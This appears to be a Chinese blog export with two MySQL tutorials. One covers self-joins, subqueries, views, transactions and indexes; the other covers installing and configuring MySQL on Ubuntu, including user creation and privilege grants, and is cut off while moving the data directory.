<li><p>citys表的proid表示城市所属的省，对应着provinces表的id值</p>
</li>
</ul>
<p>问题：</p>
<blockquote>
<p>能不能将两个表合成一张表呢？</p>
</blockquote>
<p>思考：</p>
<blockquote>
<p>观察两张表发现，citys表比provinces表多一个列proid，其它列的类型都是一样的</p>
</blockquote>
<p>意义：</p>
<blockquote>
<p>存储的都是地区信息，而且每种信息的数据量有限，没必要增加一个新表，或者将来还要存储区、乡镇信息，都增加新表的开销太大</p>
</blockquote>
<p>答案：</p>
<blockquote>
<p>定义表areas，结构如下</p>
</blockquote>
<ul>
<li>id</li>
<li>atitle</li>
<li>pid</li>
</ul>
<p>说明:</p>
<ul>
<li>因为省没有所属的省份，所以可以填写为null</li>
<li>城市所属的省份pid，填写省所对应的编号id</li>
<li>这就是自关联，表中的某一列，关联了这个表中的另外一列，但是它们的业务逻辑含义是不一样的，城市信息的pid引用的是省信息的id</li>
<li>在这个表中，结构不变，可以添加区县、乡镇街道、村社区等信息</li>
</ul>
<img src="/2019/12/14/MySQL%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/2019-12-18-22-07-15.png" class="">

<ul>
<li><p>创建areas表的语句如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table areas(</span><br><span class="line">    aid int primary key,</span><br><span class="line">    atitle varchar(20),</span><br><span class="line">    pid int</span><br><span class="line">);</span><br></pre></td></tr></table></figure></li>
<li><p>从sql文件中导入数据, <code>areas.sql</code> <a href="https://github.com/CKCat/Note/blob/master/Django/areas.sql">文件地址</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source areas.sql;</span><br></pre></td></tr></table></figure>
</li>
<li><p>查询一共有多少个省</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*) from areas where pid is null;</span><br></pre></td></tr></table></figure>
<p>例：查询省的名称为“山西省”的所有城市</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select city.* from areas as city</span><br><span class="line">inner join areas as province on city.pid=province.aid</span><br><span class="line">where province.atitle=&#x27;山西省&#x27;;</span><br></pre></td></tr></table></figure>
<p>例：查询市的名称为“广州市”的所有区县</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select dis.* from areas as dis</span><br><span class="line">inner join areas as city on city.aid=dis.pid</span><br><span class="line">where city.atitle=&#x27;广州市&#x27;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h2><p>子查询</p>
<blockquote>
<p>在一个 select 语句中,嵌入了另外一个 select 语句, 那么被嵌入的 select 语句称之为子查询语句。</p>
</blockquote>
<p>主查询</p>
<blockquote>
<p>主要查询的对象,第一条 select 语句</p>
</blockquote>
<p>主查询和子查询的关系</p>
<ul>
<li>子查询是嵌入到主查询中</li>
<li>子查询是辅助主查询的,要么充当条件,要么充当数据源</li>
<li>子查询是可以独立存在的语句,是一条完整的 select 语句</li>
</ul>
<p>子查询分类</p>
<ul>
<li>标量子查询: 子查询返回的结果是一个数据(一行一列)</li>
<li>列子查询: 返回的结果是一列(一列多行)</li>
<li>行子查询: 返回的结果是一行(一行多列)</li>
</ul>
<p>标量子查询 - 查询班级学生的平均身高</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from students where age &gt; (select avg(age) from students);</span><br></pre></td></tr></table></figure>

<p>列级子查询 - 查询还有学生在班的所有班级名字</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select name from classes where id in (select cls_id from students);</span><br></pre></td></tr></table></figure>

<p>行级子查询 - 查找班级年龄最大,身高最高的学生</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from students where (height,age) = (select max(height),max(age) from students);</span><br></pre></td></tr></table></figure>

<p>子查询中特定关键字使用</p>
<ul>
<li>in 范围<ul>
<li>格式: 主查询 where 条件 in (列子查询)</li>
</ul>
</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>查询的完整格式 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT select_expr [,select_expr,...] [      </span><br><span class="line">      FROM tb_name</span><br><span class="line">      [WHERE 条件判断]</span><br><span class="line">      [GROUP BY &#123;col_name | postion&#125; [ASC | DESC], ...] </span><br><span class="line">      [HAVING WHERE 条件判断]</span><br><span class="line">      [ORDER BY &#123;col_name|expr|postion&#125; [ASC | DESC], ...]</span><br><span class="line">      [ LIMIT &#123;[offset,]rowcount | row_count OFFSET offset&#125;]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>完整的select语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select distinct *</span><br><span class="line">from 表名</span><br><span class="line">where ....</span><br><span class="line">group by ... having ...</span><br><span class="line">order by ...</span><br><span class="line">limit start,count</span><br></pre></td></tr></table></figure>

<h1 id="MySql-高级"><a href="#MySql-高级" class="headerlink" title="MySql 高级"></a>MySql 高级</h1><h2 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h2><h3 id="视图是什么"><a href="#视图是什么" class="headerlink" title="视图是什么"></a>视图是什么</h3><p>通俗的讲，视图就是一条SELECT语句执行后返回的结果集。所以我们在创建视图的时候，主要的工作就落在创建这条SQL查询语句上。</p>
<p>视图是对若干张基本表的引用，一张虚表，查询语句执行的结果，不存储具体的数据（基本表数据发生了改变，视图也会跟着改变）；</p>
<p>方便操作，特别是查询操作，减少复杂的SQL语句，增强可读性；</p>
<h3 id="定义视图"><a href="#定义视图" class="headerlink" title="定义视图"></a>定义视图</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create view 视图名称 as select语句;</span><br></pre></td></tr></table></figure>

<h3 id="查看视图"><a href="#查看视图" class="headerlink" title="查看视图"></a>查看视图</h3><p>查看表会将所有的视图也列出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show tables;</span><br></pre></td></tr></table></figure>

<h3 id="使用视图"><a href="#使用视图" class="headerlink" title="使用视图"></a>使用视图</h3><p>视图的用途就是查询</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from v_stu_score;</span><br></pre></td></tr></table></figure>

<h3 id="删除视图"><a href="#删除视图" class="headerlink" title="删除视图"></a>删除视图</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop view 视图名称;</span><br><span class="line">例：</span><br><span class="line">drop view v_stu_sco;</span><br></pre></td></tr></table></figure>

<h3 id="视图的作用"><a href="#视图的作用" class="headerlink" title="视图的作用"></a>视图的作用</h3><ul>
<li>提高了重用性，就像一个函数</li>
<li>对数据库重构，却不影响程序的运行</li>
<li>提高了安全性能，可以对不同的用户</li>
<li>让数据更加清晰</li>
</ul>
<h2 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h2><p>所谓事务,它是一个操作序列，这些操作要么都执行，要么都不执行，它是一个不可分割的工作单位。</p>
<h3 id="事务四大特性-简称ACID"><a href="#事务四大特性-简称ACID" class="headerlink" title="事务四大特性(简称ACID)"></a>事务四大特性(简称ACID)</h3><h4 id="原子性-Atomicity"><a href="#原子性-Atomicity" class="headerlink" title="原子性(Atomicity)"></a>原子性(Atomicity)</h4><p>一个事务必须被视为一个不可分割的最小工作单元，整个事务中的所有操作要么全部提交成功，要么全部失败回滚，对于一个事务来说，不可能只执行其中的一部分操作，这就是事务的原子性.</p>
<h4 id="一致性-Consistency"><a href="#一致性-Consistency" class="headerlink" title="一致性(Consistency)"></a>一致性(Consistency)</h4><p>数据库总是从一个一致性的状态转换到另一个一致性的状态。（在前面的例子中，一致性确保了，即使在执行第三、四条语句之间时系统崩溃，支票账户中也不会损失200美元，因为事务最终没有提交，所以事务中所做的修改也不会保存到数据库中。）</p>
<h4 id="隔离性-Isolation"><a href="#隔离性-Isolation" class="headerlink" title="隔离性(Isolation)"></a>隔离性(Isolation)</h4><p>通常来说，一个事务所做的修改在最终提交以前，对其他事务是不可见的。（在前面的例子中，当执行完第三条语句、第四条语句还未开始时，此时有另外的一个账户汇总程序开始运行，则其看到支票帐户的余额并没有被减去200美元。）</p>
<h4 id="持久性-Durability"><a href="#持久性-Durability" class="headerlink" title="持久性(Durability)"></a>持久性(Durability)</h4><p>一旦事务提交，则其所做的修改会永久保存到数据库。（此时即使系统崩溃，修改的数据也不会丢失。）</p>
<h3 id="事务命令"><a href="#事务命令" class="headerlink" title="事务命令"></a>事务命令</h3><p>表的引擎类型必须是innodb类型才可以使用事务，这是mysql表的默认引擎</p>
<p>查看表的创建语句，可以看到engine&#x3D;innodb</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 选择数据库</span><br><span class="line">use jing_dong;</span><br><span class="line">-- 查看goods表</span><br><span class="line">show create table goods;</span><br></pre></td></tr></table></figure>

<p>开启事务，命令如下：</p>
<p>开启事务后执行修改命令，变更会维护到本地缓存中，而不维护到物理表中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">begin;</span><br><span class="line">或者</span><br><span class="line">start transaction;</span><br></pre></td></tr></table></figure>

<p>提交事务，命令如下</p>
<p>将缓存中的数据变更维护到物理表中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">commit;</span><br></pre></td></tr></table></figure>

<p>回滚事务，命令如下：</p>
<p>放弃缓存中变更的数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rollback;</span><br></pre></td></tr></table></figure>
<p>注意</p>
<ul>
<li>修改数据的命令会自动的触发事务，包括insert、update、delete</li>
<li>而在SQL语句中有手动开启事务的原因是：可以进行多次数据的修改，如果成功一起成功，否则一起会滚到之前的数据</li>
</ul>
<h3 id="提交"><a href="#提交" class="headerlink" title="提交"></a>提交</h3><p>为了演示效果，需要打开两个终端窗口，使用同一个数据库，操作同一张表</p>
<p>step1：连接</p>
<p>终端1：查询商品分类信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from goods_cates;</span><br></pre></td></tr></table></figure>
<p>step2：增加数据</p>
<p>终端2：开启事务，插入数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">begin;</span><br><span class="line">insert into goods_cates(name) values(&#x27;小霸王游戏机&#x27;);</span><br></pre></td></tr></table></figure>
<p>终端2：查询数据，此时有新增的数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from goods_cates;</span><br></pre></td></tr></table></figure>
<p>step3：查询</p>
<p>终端1：查询数据，发现并没有新增的数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from goods_cates;</span><br></pre></td></tr></table></figure>
<p>step4：提交</p>
<p>终端2：完成提交</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">commit;</span><br></pre></td></tr></table></figure>
<p>step5：查询</p>
<p>终端1：查询，发现有新增的数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from goods_cates;</span><br></pre></td></tr></table></figure>

<h3 id="回滚"><a href="#回滚" class="headerlink" title="回滚"></a>回滚</h3><p>为了演示效果，需要打开两个终端窗口，使用同一个数据库，操作同一张表</p>
<p>step1：连接</p>
<p>终端1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from goods_cates;</span><br></pre></td></tr></table></figure>
<p>step2：增加数据</p>
<p>终端2：开启事务，插入数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">begin;</span><br><span class="line">insert into goods_cates(name) values(&#x27;小霸王游戏机&#x27;);</span><br></pre></td></tr></table></figure>
<p>终端2：查询数据，此时有新增的数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from goods_cates;</span><br></pre></td></tr></table></figure>
<p>step3：查询</p>
<p>终端1：查询数据，发现并没有新增的数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from goods_cates;</span><br></pre></td></tr></table></figure>
<p>step4：回滚</p>
<p>终端2：完成回滚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rollback;</span><br></pre></td></tr></table></figure>
<p>step5：查询</p>
<p>终端1：查询数据，发现没有新增的数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from goods_cates;</span><br></pre></td></tr></table></figure>

<h3 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h3><h4 id="索引是什么"><a href="#索引是什么" class="headerlink" title="索引是什么"></a>索引是什么</h4><p>索引是一种特殊的文件(InnoDB数据表上的索引是表空间的一个组成部分)，它们包含着对数据表里所有记录的引用指针。</p>
<p>更通俗的说，数据库索引好比是一本书前面的目录，能加快数据库的查询速度。</p>
<h4 id="索引目的"><a href="#索引目的" class="headerlink" title="索引目的"></a>索引目的</h4><p>索引的目的在于提高查询效率，可以类比字典，如果要查“mysql”这个单词，我们肯定需要定位到m字母，然后从下往下找到y字母，再找到剩下的sql。如果没有索引，那么你可能需要把所有单词看一遍才能找到你想要的，如果我想找到m开头的单词呢？或者ze开头的单词呢？是不是觉得如果没有索引，这个事情根本无法完成？</p>
<h4 id="索引原理"><a href="#索引原理" class="headerlink" title="索引原理"></a>索引原理</h4><p>除了词典，生活中随处可见索引的例子，如火车站的车次表、图书的目录等。它们的原理都是一样的，通过不断的缩小想要获得数据的范围来筛选出最终想要的结果，同时把随机的事件变成顺序的事件，也就是我们总是通过同一种查找方式来锁定数据。</p>
<p>数据库也是一样，但显然要复杂许多，因为不仅面临着等值查询，还有范围查询(&gt;、&lt;、between、in)、模糊查询(like)、并集查询(or)等等。数据库应该选择怎么样的方式来应对所有的问题呢？我们回想字典的例子，能不能把数据分成段，然后分段查询呢？最简单的如果1000条数据，1到100分成第一段，101到200分成第二段，201到300分成第三段……这样查第250条数据，只要找第三段就可以了，一下子去除了90%的无效数据。</p>
<h4 id="索引的使用"><a href="#索引的使用" class="headerlink" title="索引的使用"></a>索引的使用</h4><p>查看索引</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show index from 表名;</span><br></pre></td></tr></table></figure>

<p>创建索引</p>
<ul>
<li>如果指定字段是字符串，需要指定长度，建议长度与定义字段时的长度一致</li>
<li>字段类型如果不是字符串，可以不填写长度部分<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create index 索引名称 on 表名(字段名称(长度))</span><br></pre></td></tr></table></figure></li>
</ul>
<p>删除索引：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop index 索引名称 on 表名;</span><br></pre></td></tr></table></figure>

<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>创建测试表testindex</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table test_index(title varchar(10));</span><br></pre></td></tr></table></figure>

<p>使用python程序通过pymsql模块 向表中加入十万条数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pymysql import *</span><br><span class="line"></span><br><span class="line">def insert():</span><br><span class="line">    # 创建 Connection 连接</span><br><span class="line">    conn = connect(host=&quot;localhost&quot;, port=3306, database=&quot;jing_dong&quot;, user=&quot;ckcat&quot;, password=&quot;mysql&quot;, charset=&quot;utf8mb4&quot;)</span><br><span class="line">    # 获得 Cursor 对象</span><br><span class="line">    cs = conn.cursor()</span><br><span class="line"></span><br><span class="line">    # 插入10万次数据</span><br><span class="line">    for i in range(100000):</span><br><span class="line">        cs.execute(&quot;insert into test_index values(&#x27;ha-%d&#x27;)&quot; % i)</span><br><span class="line">    # 提交数据</span><br><span class="line">    conn.commit()</span><br><span class="line"></span><br><span class="line">    # 关闭 cursor 对象 和 Connection 对象</span><br><span class="line">    cs.close()</span><br><span class="line">    conn.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    insert()</span><br></pre></td></tr></table></figure>

<h4 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h4><p>开启运行时间监测：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set profiling=1;</span><br></pre></td></tr></table></figure>
<p>查找第1万条数据ha-99999</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from test_index where title=&#x27;ha-99999&#x27;;</span><br></pre></td></tr></table></figure>
<p>查看执行的时间：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show profiles;</span><br></pre></td></tr></table></figure>
<p>为表title_index的title列创建索引：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create index title_index on test_index(title(10));</span><br></pre></td></tr></table></figure>
<p>执行查询语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from test_index where title=&#x27;ha-99999&#x27;;</span><br></pre></td></tr></table></figure>
<p>再次查看执行的时间</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show profiles;</span><br></pre></td></tr></table></figure>

<h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4><p>要注意的是，建立太多的索引将会影响更新和插入的速度，因为它需要同样更新每个索引文件。对于一个经常需要更新和插入的表格，就没有必要为一个很少使用的where字句单独建立索引了，对于比较小的表，排序的开销不会很大，也没有必要建立另外的索引。</p>
<p>建立索引会占用磁盘空间</p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL的安装和配置</title>
    <url>/2019/12/15/MySQL%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h1 id="MySQL-服务其安装与配置"><a href="#MySQL-服务其安装与配置" class="headerlink" title="MySQL 服务其安装与配置"></a>MySQL 服务其安装与配置</h1><blockquote>
<p>转载：<a href="https://www.digitalocean.com/community/tutorials/how-to-install-mysql-on-ubuntu-18-04">https://www.digitalocean.com/community/tutorials/how-to-install-mysql-on-ubuntu-18-04</a></p>
</blockquote>
<h2 id="安装-MySQL"><a href="#安装-MySQL" class="headerlink" title="安装 MySQL"></a>安装 MySQL</h2><p>首先运行下面命令更新软件包：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt update</span><br></pre></td></tr></table></figure>

<p>然后安装默认软件包：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt install mysql-server</span><br></pre></td></tr></table></figure>

<p>这将安装 MySQL，但不会提示您设置密码或进行任何其他配置更改。</p>
<h2 id="调整用户身份验证和特权"><a href="#调整用户身份验证和特权" class="headerlink" title="调整用户身份验证和特权"></a>调整用户身份验证和特权</h2><h3 id="创建-root-密码"><a href="#创建-root-密码" class="headerlink" title="创建 root 密码"></a>创建 root 密码</h3><p>在运行 MySQL 5.7（及更高版本）的 Ubuntu 系统中，默认情况下，MySQL root 用户设置为使用 <code>auth_socket</code> 插件而不是密码进行身份验证。</p>
<p>为了使用密码以 root 用户身份连接到 MySQL ，您需要将其身份验证方法从切换 <code>auth_socket</code> 为 <code>mysql_native_password</code> ，首先使用 root 账号打开 mysql。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo mysql</span><br></pre></td></tr></table></figure>

<p>接下来，使用以下命令检查每个 MySQL 用户帐户使用的身份验证方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT user,authentication_string,plugin,host FROM mysql.user;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Output</span><br><span class="line">+------------------+-------------------------------------------+-----------------------+-----------+</span><br><span class="line">| user             | authentication_string                     | plugin                | host      |</span><br><span class="line">+------------------+-------------------------------------------+-----------------------+-----------+</span><br><span class="line">| root             |                                           | auth_socket           | localhost |</span><br><span class="line">| mysql.session    | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | mysql_native_password | localhost |</span><br><span class="line">| mysql.sys        | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | mysql_native_password | localhost |</span><br><span class="line">| debian-sys-maint | *CC744277A401A7D25BE1CA89AFF17BF607F876FF | mysql_native_password | localhost |</span><br><span class="line">+------------------+-------------------------------------------+-----------------------+-----------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>在此示例中，您可以看到 root 用户实际上使用 auth_socket 插件进行了身份验证。要将 root 帐户配置为使用密码进行身份验证，请运行以下 <code>ALTER USER</code> 命令。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;password&#x27;;</span><br></pre></td></tr></table></figure>

<p>然后，运行 <code>FLUSH PRIVILEGES</code> 告诉服务器重新加载授权表并使新的更改生效：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure>

<p>再次检查每个用户使用的身份验证方法，以确认 root 不再使用该 auth_socket 插件进行身份验证：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT user,authentication_string,plugin,host FROM mysql.user;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Output</span><br><span class="line">+------------------+-------------------------------------------+-----------------------+-----------+</span><br><span class="line">| user             | authentication_string                     | plugin                | host      |</span><br><span class="line">+------------------+-------------------------------------------+-----------------------+-----------+</span><br><span class="line">| root             | *3636DACC8616D997782ADD0839F92C1571D6D78F | mysql_native_password | localhost |</span><br><span class="line">| mysql.session    | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | mysql_native_password | localhost |</span><br><span class="line">| mysql.sys        | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | mysql_native_password | localhost |</span><br><span class="line">| debian-sys-maint | *CC744277A401A7D25BE1CA89AFF17BF607F876FF | mysql_native_password | localhost |</span><br><span class="line">+------------------+-------------------------------------------+-----------------------+-----------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>您可以在此示例输出中看到，MySQL 根用户现在使用密码进行了身份验证。</p>
<h3 id="创建普通用户"><a href="#创建普通用户" class="headerlink" title="创建普通用户"></a>创建普通用户</h3><p>一般情况下，我们会创建一个普通用户操作 mysql 数据库，可以按下面方法创建一个普通用户。</p>
<p>首先使用 root 账号进入 mysql 中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ mysql -u root -p</span><br></pre></td></tr></table></figure>

<p>接着创建一个新用户并为其设置一个强密码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; CREATE USER &#x27;username&#x27;@&#x27;host&#x27; IDENTIFIED BY &#x27;password&#x27;;</span><br></pre></td></tr></table></figure>

<ul>
<li>username: 创建的用户名。</li>
<li>host: 指定该用户在哪个主机上可以登陆，如果是本地用户可用 localhost，如果是远程登陆，可以使用通配符 <code>%</code> 。</li>
<li>password：用户的登陆密码。</li>
</ul>
<blockquote>
<p>其中需要注意的是，如果 host 指定为 <code>%</code> ，那么还需要进入设置 <code>/etc/mysql/mysql.conf.d/mysqld.cnf</code> 配置文件，注释掉其中的 <code>bind-address = 127.0.0.1</code> 行，然后执行 <code>sudo systemctl restart mysql</code> 重新启动 mysql 服务。</p>
</blockquote>
<p>例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CREATE USER <span class="string">&#x27;ckcat&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED BY <span class="string">&#x27;xxxxxxxx&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="给新用户授权"><a href="#给新用户授权" class="headerlink" title="给新用户授权"></a>给新用户授权</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; GRANT privileges ON databasename.tablename TO &#x27;username&#x27;@&#x27;host&#x27;</span><br></pre></td></tr></table></figure>

<ul>
<li>privileges：用户的操作权限。如 SELECT，INSERT，UPDATE 等，如果要授予所的权限则使用 ALL</li>
<li>databasename：数据库名</li>
<li>tablename：表名，如果要授予该用户对所有数据库和表的相应操作权限则可用表示，如 <code>.*</code> 。</li>
</ul>
<p>例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; GRANT SELECT, INSERT ON test.user TO <span class="string">&#x27;ckcat&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br><span class="line">mysql&gt; GRANT ALL ON *.* TO <span class="string">&#x27;ckcat&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br><span class="line">mysql&gt; flush privileges;</span><br><span class="line">mysql&gt; show grants <span class="keyword">for</span> <span class="string">&#x27;ckcat&#x27;</span>@<span class="string">&#x27;%&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="配置-MySQL"><a href="#配置-MySQL" class="headerlink" title="配置 MySQL"></a>配置 MySQL</h2><p>对于全新安装，您将需要运行随附的安全脚本。这会更改一些不太安全的默认选项，例如远程 root 登录和样本用户。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo mysql_secure_installation</span><br></pre></td></tr></table></figure>

<p>这将引导您完成一系列提示，在其中您可以对 MySQL 安装的安全性选项进行一些更改。第一个提示将询问您是否要设置验证密码插件，该插件可用于测试 MySQL 密码的强度。无论您选择什么，下一个提示都是为 MySQL root 用户设置密码。输入，然后确认您选择的安全密码。</p>
<h2 id="1-4-测试-MySQL"><a href="#1-4-测试-MySQL" class="headerlink" title="1.4. 测试 MySQL"></a>1.4. 测试 MySQL</h2><p>无论您如何安装，MySQL 都应该已经开始自动运行。要对此进行测试，请检查其状态。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$  systemctl status mysql.service</span><br></pre></td></tr></table></figure>

<p>您将看到类似于以下内容的输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">● mysql.service - MySQL Community Server</span><br><span class="line">   Loaded: loaded (/lib/systemd/system/mysql.service; enabled; vendor preset: en</span><br><span class="line">   Active: active (running) since Sun 2019-12-15 10:36:06 CST; 32min ago</span><br><span class="line"> Main PID: 8876 (mysqld)</span><br><span class="line">    Tasks: 35 (limit: 4915)</span><br><span class="line">   CGroup: /system.slice/mysql.service</span><br><span class="line">           └─8876 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid</span><br><span class="line"></span><br><span class="line">Dec 15 10:36:05 ckcat-ubuntu systemd[1]: Starting MySQL Community Server...</span><br><span class="line">Dec 15 10:36:06 ckcat-ubuntu systemd[1]: Started MySQL Community Server.</span><br></pre></td></tr></table></figure>

<p>如果 MySQL 未运行，则可以使用来启动它 <code>sudo systemctl start mysql</code> ，也可以通过下列方法进行操作。</p>
<p>启动服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo service mysql start</span><br></pre></td></tr></table></figure>

<p>停止服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo service mysql stop</span><br></pre></td></tr></table></figure>

<p>重启服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo service mysql restart</span><br></pre></td></tr></table></figure>

<h2 id="使用-MySQL-Workbench-连接数据库"><a href="#使用-MySQL-Workbench-连接数据库" class="headerlink" title="使用 MySQL Workbench 连接数据库"></a>使用 MySQL Workbench 连接数据库</h2><p>安装 MySQL Workbench</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install mysql-workbench</span><br></pre></td></tr></table></figure>

<p>启动 MySQL Workbench ，选择 ip、端口、用户名，输入密码连接对应的数据库</p>
<img src="/2019/12/15/MySQL%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/2019-12-15-11-30-54.png" class="">

<h1 id="将-MySQL-数据目录移动到新位置"><a href="#将-MySQL-数据目录移动到新位置" class="headerlink" title="将 MySQL 数据目录移动到新位置"></a>将 MySQL 数据目录移动到新位置</h1><blockquote>
<p>参考：<a href="https://www.digitalocean.com/community/tutorials/how-to-move-a-mysql-data-directory-to-a-new-location-on-ubuntu-18-04">https://www.digitalocean.com/community/tutorials/how-to-move-a-mysql-data-directory-to-a-new-location-on-ubuntu-18-04</a></p>
</blockquote>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>数据库会随着时间增长，有时会超出文件系统上的空间。当 I&#x2F;O 与操作系统的其余部分位于同一分区时，您也可能会遇到 I&#x2F;O 竞争。 RAID 、网络块存储和其他设备可以提供冗余和其他所需的功能。无论您是要添加更多空间，评估优化性能的方式还是希望利用其他存储功能，本教程都将指导您重新定位 MySQL 的数据目录。</p>
<h2 id="先决条件"><a href="#先决条件" class="headerlink" title="先决条件"></a>先决条件</h2><p>要完成本指南，您将需要：</p>
<ul>
<li>具有非 root 用户 sudo 特权的 Ubuntu 18.04 服务器。</li>
<li>一个 MySQL 服务器</li>
</ul>
<p>在此示例中，我们将数据移至 <code>~/.mysqldata</code> 目录中。</p>
<h2 id="第-1-步-移动-MySQL-数据目录"><a href="#第-1-步-移动-MySQL-数据目录" class="headerlink" title="第 1 步-移动 MySQL 数据目录"></a>第 1 步-移动 MySQL 数据目录</h2><p>为了准备移动 MySQL 的数据目录，让我们通过使用管理凭据启动交互式 MySQL 会话来验证当前位置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ mysql -u root -p</span><br></pre></td></tr></table></figure>

